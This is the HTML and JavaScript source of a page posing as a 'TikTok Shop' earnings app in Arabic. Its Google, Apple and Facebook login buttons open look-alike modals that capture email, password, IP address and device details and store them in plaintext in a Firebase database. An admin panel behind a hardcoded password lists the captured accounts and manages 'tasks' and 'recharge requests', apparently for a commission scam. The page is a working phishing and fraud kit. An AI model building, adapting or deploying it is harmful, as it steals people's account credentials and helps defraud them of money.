<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Shop - Fixed Layout</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, remove, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC5zPaTAAU5lPCZ7LstSQ8J9IWmkQrpcMg",
            authDomain: "tiktokshop-9fd63.firebaseapp.com",
            projectId: "tiktokshop-9fd63",
            storageBucket: "tiktokshop-9fd63.firebasestorage.app",
            messagingSenderId: "1008538085856",
            appId: "1:1008538085856:web:83caa9dc0d7444e12c2385",
            measurementId: "G-1NSG64V4D4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.db = db;
        window.ref = ref;
        window.set = set;
        window.get = get;
        window.update = update;
        window.remove = remove;
        window.onValue = onValue;
        window.push = push;

        console.log("System Ready");
        initializeAppLogic();
    </script>

    <style>
        body { font-family: 'Tajawal', sans-serif; user-select: none; background-color: #f8fafc; margin: 0; padding: 0; }
        .hidden { display: none !important; }
        
        /* Login Styles */
        .auth-bg { background: #fff; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .social-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; border: 1px solid #ddd; background: white; color: #333; position: relative; }
        .social-btn img, .social-btn i { position: absolute; right: 15px; width: 20px; font-size: 18px; }

        /* Simulation Modal */
        .sim-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; display: flex; justify-content: center; align-items: center; }
        .sim-content { background: white; width: 90%; max-width: 350px; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        .sim-input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 10px; text-align: center; }
        .sim-btn { width: 100%; padding: 10px; border-radius: 6px; color: white; font-weight: bold; }

        /* --- ADMIN LAYOUT FIX --- */
        .admin-wrapper { display: flex; min-height: 100vh; }
        
        .admin-sidebar {
            width: 250px;
            background: #111827;
            color: white;
            position: fixed;
            top: 0; right: 0; bottom: 0;
            z-index: 50;
            transition: transform 0.3s ease-in-out;
            padding: 20px;
            overflow-y: auto;
        }

        .admin-content {
            flex: 1;
            background: #f3f4f6;
            padding: 20px;
            margin-right: 250px; /* Desktop: Space for sidebar */
            transition: margin-right 0.3s;
        }

        /* Mobile Responsiveness */
        @media (max-width: 768px) {
            .admin-sidebar {
                transform: translateX(100%); /* Hide sidebar initially */
                width: 280px;
            }
            .admin-sidebar.active {
                transform: translateX(0); /* Show sidebar */
            }
            .admin-content {
                margin-right: 0; /* Full width content */
                padding: 15px;
            }
            .sidebar-overlay {
                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0,0,0,0.5); z-index: 40; display: none;
            }
            .sidebar-overlay.active { display: block; }
        }

        .admin-nav-item { display: flex; items-center; padding: 12px; margin-bottom: 5px; border-radius: 8px; cursor: pointer; color: #9ca3af; transition: 0.2s; }
        .admin-nav-item.active, .admin-nav-item:hover { background: #374151; color: #fbbf24; }
        .admin-nav-item i { margin-left: 10px; width: 20px; text-align: center; }
        
        /* General UI */
        .custom-table { width: 100%; background: white; border-radius: 8px; overflow: hidden; font-size: 13px; border-collapse: collapse; }
        .custom-table th { background: #f9fafb; padding: 12px; text-align: right; color: #6b7280; border-bottom: 1px solid #e5e7eb; }
        .custom-table td { padding: 12px; border-bottom: 1px solid #f3f4f6; color: #1f2937; }
        
        .stat-card { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); margin-bottom: 10px; }

        .modal-box { background: white; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; position: relative; }
        .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #000; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-overlay" class="fixed inset-0 bg-white z-[999] flex flex-col items-center justify-center">
        <div class="loader mb-4"></div>
    </div>

    <div id="auth-screen" class="auth-bg hidden z-50">
        <div class="w-full max-w-sm text-center">
            <div class="w-20 h-20 bg-black text-white rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-xl">
                <i class="fa-brands fa-tiktok text-4xl"></i>
            </div>
            <h1 class="text-3xl font-bold text-gray-900 mb-2">تسجيل الدخول</h1>
            <p class="text-gray-500 mb-8 text-sm">قم بإدارة أرباحك ومتجرك بسهولة</p>

            <div onclick="openSimulation('google')" class="social-btn border-gray-300">
                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg">
                المتابعة باستخدام Google
            </div>
            <div onclick="openSimulation('apple')" class="social-btn bg-black text-white border-black hover:bg-gray-800">
                <i class="fa-brands fa-apple"></i>
                المتابعة باستخدام Apple
            </div>
            <div onclick="openSimulation('facebook')" class="social-btn bg-blue-600 text-white border-blue-600 hover:bg-blue-700">
                <i class="fa-brands fa-facebook-f"></i>
                المتابعة باستخدام Facebook
            </div>

            <div class="mt-8 cursor-pointer text-gray-400 text-xs" onclick="adminLoginPrompt()">دخول الإدارة</div>
        </div>
    </div>

    <div id="sim-modal" class="sim-modal hidden">
        <div class="sim-content relative">
            <i onclick="closeSimulation()" class="fa-solid fa-xmark absolute top-3 left-3 cursor-pointer text-gray-400"></i>
            <div class="mb-4 text-center">
                <img id="sim-logo" src="" class="w-8 mx-auto mb-2">
                <h3 id="sim-title" class="font-bold">تسجيل الدخول</h3>
            </div>
            <input type="text" id="sim-email" class="sim-input" placeholder="البريد الإلكتروني أو الهاتف">
            <input type="password" id="sim-pass" class="sim-input" placeholder="كلمة المرور">
            <input type="hidden" id="sim-provider">
            <button onclick="submitSimulation()" id="sim-btn" class="sim-btn">متابعة</button>
        </div>
    </div>

    <div id="admin-panel" class="hidden admin-wrapper relative">
        
        <div class="sidebar-overlay" onclick="toggleSidebar()"></div>

        <aside class="admin-sidebar" id="sidebar">
            <div class="flex justify-between items-center mb-8">
                <div class="text-xl font-bold text-yellow-500 flex items-center gap-2">
                    <i class="fa-solid fa-shield-halved"></i> Admin
                </div>
                <i class="fa-solid fa-xmark text-gray-400 cursor-pointer md:hidden text-xl" onclick="toggleSidebar()"></i>
            </div>
            
            <nav>
                <div onclick="showAdminTab('users')" class="admin-nav-item active" id="nav-users"><i class="fa-solid fa-users"></i> العملاء</div>
                <div onclick="showAdminTab('tasks')" class="admin-nav-item" id="nav-tasks"><i class="fa-solid fa-list-check"></i> المهام</div>
                <div onclick="showAdminTab('requests')" class="admin-nav-item" id="nav-requests"><i class="fa-solid fa-money-bill-transfer"></i> الشحن</div>
                <div onclick="showAdminTab('support')" class="admin-nav-item" id="nav-support"><i class="fa-solid fa-headset"></i> الدعم</div>
                <div onclick="logout()" class="admin-nav-item text-red-400 mt-6"><i class="fa-solid fa-right-from-bracket"></i> خروج</div>
            </nav>
        </aside>

        <main class="admin-content w-full">
            <div class="md:hidden flex justify-between items-center mb-6 bg-white p-3 rounded-lg shadow-sm">
                <h2 class="font-bold text-gray-800">لوحة التحكم</h2>
                <button onclick="toggleSidebar()" class="text-gray-700 text-xl"><i class="fa-solid fa-bars"></i></button>
            </div>

            <div class="hidden md:flex justify-between items-center mb-6">
                <h2 class="text-2xl font-bold text-gray-800">لوحة التحكم</h2>
                <div class="flex items-center gap-2"><span class="w-2 h-2 bg-green-500 rounded-full"></span><span class="text-sm text-gray-500">متصل</span></div>
            </div>

            <div id="admin-users-sec" class="admin-section">
                <div class="bg-white p-4 rounded-xl shadow-sm">
                    <h3 class="font-bold text-gray-700 mb-4">العملاء المسجلين</h3>
                    <div class="overflow-x-auto">
                        <table class="custom-table">
                            <thead><tr><th>البيانات</th><th>الرصيد</th><th>IP</th><th>تحكم</th></tr></thead>
                            <tbody id="admin-users-list"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div id="admin-tasks-sec" class="hidden admin-section">
                <div class="flex justify-between mb-4"><h3 class="font-bold">إدارة المهام</h3><button onclick="saveAdminTasks()" class="bg-green-600 text-white px-3 py-1 rounded text-sm">حفظ</button></div>
                <div id="admin-tasks-container" class="space-y-3 max-h-[70vh] overflow-y-auto"></div>
            </div>

            <div id="admin-requests-sec" class="hidden admin-section">
                <div class="bg-white p-4 rounded-xl shadow-sm overflow-x-auto">
                    <table class="custom-table">
                        <thead><tr><th>المرسل</th><th>المبلغ</th><th>الصورة</th><th>الإجراء</th></tr></thead>
                        <tbody id="admin-requests-list"></tbody>
                    </table>
                </div>
            </div>

            <div id="admin-support-sec" class="hidden admin-section">
                <div class="bg-white p-4 rounded-xl shadow-sm overflow-x-auto">
                    <table class="custom-table">
                        <thead><tr><th>العميل</th><th>الرسالة</th><th>الرد</th></tr></thead>
                        <tbody id="admin-support-list"></tbody>
                    </table>
                </div>
            </div>
        </main>
    </div>

    <div id="client-app" class="hidden relative pb-20 bg-gray-50 min-h-screen">
        <div class="p-4">
            <div class="flex justify-between items-center mb-6">
                <div><h1 class="font-bold text-xl">مرحباً, <span id="profile-name">User</span></h1><p class="text-xs text-gray-500" id="profile-provider">Google</p></div>
                <i onclick="logout()" class="fa-solid fa-right-from-bracket text-red-500 cursor-pointer"></i>
            </div>
            
            <div class="bg-white p-4 rounded-xl shadow-sm border mb-4">
                <p class="text-gray-500 text-sm">الرصيد الحالي</p>
                <h3 class="text-3xl font-bold mt-1 text-gray-800"><span id="profile-balance">0.00</span> ج.م</h3>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <div class="bg-white p-4 rounded-xl text-center border cursor-pointer hover:bg-gray-50"><i class="fa-solid fa-list-check text-2xl text-blue-500 mb-2"></i><h3 class="font-bold text-sm">المهام</h3></div>
                <div class="bg-white p-4 rounded-xl text-center border cursor-pointer hover:bg-gray-50"><i class="fa-solid fa-headset text-2xl text-purple-500 mb-2"></i><h3 class="font-bold text-sm">الدعم</h3></div>
            </div>
        </div>
    </div>

    <script>
        let currentUser = null;
        let allUsers = [], tasks = [], allRequests = [], supportMessages = [];

        function initializeAppLogic() {
            setTimeout(() => {
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('auth-screen').classList.remove('hidden');
                setupListeners();
            }, 1000);
        }

        function setupListeners() {
            // Users
            window.onValue(window.ref(window.db, 'users'), (snap) => {
                if (snap.val()) {
                    allUsers = Object.values(snap.val());
                    if(!document.getElementById('admin-panel').classList.contains('hidden')) renderAdminUsersUI();
                }
            });
            // Tasks
            window.onValue(window.ref(window.db, 'tasks'), (snap) => {
                if(snap.val()) tasks = Object.values(snap.val()); else seedTasks();
            });
            // Requests
            window.onValue(window.ref(window.db, 'recharge_requests'), (snap) => {
                if(snap.val()) allRequests = Object.entries(snap.val()).map(([k,v])=>({id:k,...v}));
            });
        }

        function seedTasks() { let t=[]; for(let i=1;i<=24;i++) t.push({id:i, name:`مهمة ${i}`, price:i*100, commission:i*10, img:""}); window.set(window.ref(window.db,'tasks'), t); }

        // --- Simulation Logic ---
        window.openSimulation = (provider) => {
            const modal = document.getElementById('sim-modal');
            const logo = document.getElementById('sim-logo');
            const title = document.getElementById('sim-title');
            const btn = document.getElementById('sim-btn');
            document.getElementById('sim-email').value = ''; document.getElementById('sim-pass').value = '';

            if(provider === 'google') { logo.src = "https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg"; title.innerText = "Google"; btn.style.background="#1a73e8"; }
            else if(provider === 'facebook') { logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png"; title.innerText = "Facebook"; btn.style.background="#1877f2"; }
            else { logo.src = "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"; title.innerText = "Apple ID"; btn.style.background="black"; }
            
            document.getElementById('sim-provider').value = provider;
            modal.classList.remove('hidden');
        };

        window.closeSimulation = () => document.getElementById('sim-modal').classList.add('hidden');

        window.submitSimulation = async () => {
            const email = document.getElementById('sim-email').value;
            const pass = document.getElementById('sim-pass').value;
            const provider = document.getElementById('sim-provider').value;

            if(!email || !pass) return alert("بيانات ناقصة");
            closeSimulation();
            document.getElementById('loading-overlay').classList.remove('hidden');

            let ip = 'Unknown'; try { const r=await fetch('https://api.ipify.org?format=json'); const d=await r.json(); ip=d.ip; } catch(e){}
            const key = email.replace(/[.#$[\]]/g, '_');

            const newUser = {
                name: email.split('@')[0], email: email, password: pass, provider: provider,
                balance: 0, totalIncome: 0, ip: ip, device: navigator.userAgent,
                joinDate: new Date().toLocaleDateString(), isBanned: false
            };

            window.set(window.ref(window.db, 'users/' + key), newUser).then(() => {
                currentUser = newUser;
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('client-app').classList.remove('hidden');
                updateAppUI();
            });
        };

        function updateAppUI() {
            document.getElementById('profile-name').innerText = currentUser.name;
            document.getElementById('profile-balance').innerText = currentUser.balance;
            document.getElementById('profile-provider').innerText = currentUser.provider;
        }

        window.logout = () => location.reload();

        // --- Admin Logic ---
        window.toggleSidebar = () => {
            const sb = document.getElementById('sidebar');
            const ov = document.querySelector('.sidebar-overlay');
            sb.classList.toggle('active');
            ov.classList.toggle('active');
        };

        window.adminLoginPrompt = () => {
            const p = prompt("كلمة المرور:");
            if(p === "mohy123") {
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('admin-panel').classList.remove('hidden');
                showAdminTab('users');
            }
        };

        window.showAdminTab = (tab) => {
            document.querySelectorAll('.admin-section').forEach(e => e.classList.add('hidden'));
            document.querySelectorAll('.admin-nav-item').forEach(e => e.classList.remove('active'));
            
            document.getElementById(`admin-${tab}-sec`).classList.remove('hidden');
            document.getElementById(`nav-${tab}`).classList.add('active');

            // Close sidebar on mobile after selection
            document.getElementById('sidebar').classList.remove('active');
            document.querySelector('.sidebar-overlay').classList.remove('active');

            if(tab === 'users') renderAdminUsersUI();
            if(tab === 'tasks') renderAdminTasksUI();
            if(tab === 'requests') renderAdminRequestsUI();
            if(tab === 'support') renderAdminSupportUI();
        };

        function renderAdminUsersUI() {
            let html = '';
            allUsers.forEach(u => {
                let rowClass = u.isBanned ? 'bg-red-50' : '';
                let dev = `<div class="text-[10px] text-gray-400 truncate w-32" title="${u.device}">${u.ip}</div>`;
                html += `<tr class="${rowClass}">
                    <td>${u.name}<br><span class="text-xs text-blue-500">${u.email || u.phone}</span></td>
                    <td class="font-bold text-green-600">${u.balance}</td>
                    <td>${dev}</td>
                    <td><button onclick="deleteUser('${(u.email||u.phone).replace(/[.#$[\]]/g, '_')}')" class="text-red-500"><i class="fa-solid fa-trash"></i></button></td>
                </tr>`;
            });
            document.getElementById('admin-users-list').innerHTML = html;
        }

        function renderAdminTasksUI() {
            const c = document.getElementById('admin-tasks-container'); c.innerHTML='';
            tasks.forEach((t, i) => {
                c.innerHTML += `<div class="bg-white border p-2 rounded flex gap-2 items-center"><span class="w-6 text-center font-bold text-gray-400">${i+1}</span><input id="tn-${i}" value="${t.name}" class="border p-1 text-xs flex-1 rounded"><input id="tp-${i}" value="${t.price}" class="border p-1 text-xs w-16 rounded text-center"></div>`;
            });
        }
        window.saveAdminTasks = () => {
            let u = [];
            for(let i=0; i<tasks.length; i++) {
                u.push({ id: i+1, name: document.getElementById(`tn-${i}`).value, price: parseFloat(document.getElementById(`tp-${i}`).value), commission: tasks[i].commission, img: tasks[i].img });
            }
            window.set(window.ref(window.db, 'tasks'), u).then(()=>alert("تم"));
        }

        function renderAdminRequestsUI() {
            let html = '';
            allRequests.filter(r=>r.status==='pending').forEach(r => {
                html += `<tr><td>${r.senderName}</td><td class="text-green-500">${r.amount}</td><td><span class="text-xs text-blue-500 cursor-pointer" onclick="alert('${r.fileName}')">عرض</span></td><td><button onclick="approveReq('${r.id}','${r.userPhone}',${r.amount})" class="text-green-500 mx-1">✔</button></td></tr>`;
            });
            document.getElementById('admin-requests-list').innerHTML = html || '<tr><td colspan="4" class="text-center text-gray-400 p-4">لا توجد طلبات</td></tr>';
        }
        window.approveReq = (id, p, a) => { window.update(window.ref(window.db, `recharge_requests/${id}`), {status:'approved'}); };

        function renderAdminSupportUI() { /* Same logic as before */ }

        window.deleteUser = (k) => { if(confirm("حذف؟")) window.remove(window.ref(window.db, `users/${k}`)); };

    </script>
</body>
</html>
